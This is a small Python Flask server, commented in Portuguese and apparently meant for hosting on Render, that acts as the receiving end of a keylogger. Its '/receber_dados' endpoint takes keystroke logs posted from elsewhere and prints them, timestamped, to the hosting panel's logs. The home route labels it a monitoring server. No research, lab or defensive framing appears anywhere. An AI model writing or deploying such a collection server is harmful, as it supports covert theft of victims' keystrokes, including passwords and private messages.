from flask import Flask, request
from datetime import datetime
import os

app = Flask(__name__)

# Rota para a página inicial (evita erro 404 ao abrir o link)
@app.route('/')
def home():
    return "Servidor de Monitoramento Online!", 200

@app.route('/receber_dados', methods=['POST'])
def receber_dados():
    # Pega os dados enviados pelo formulário
    keylogs = request.form.get('keylogs')
    
    if keylogs:
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        # EXIBE NOS LOGS DO PAINEL DO RENDER
        print(f"\n\n>>> LOG RECEBIDO ÀS {timestamp}:")
        print("-" * 30)
        print(keylogs)
        print("-" * 30)
        
        return "OK", 200
    
    return "Vazio", 400

if __name__ == "__main__":
    # Esta parte só roda se você executar no seu PC (python app.py)
    # No Render, o Gunicorn usa a variável 'app' diretamente
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)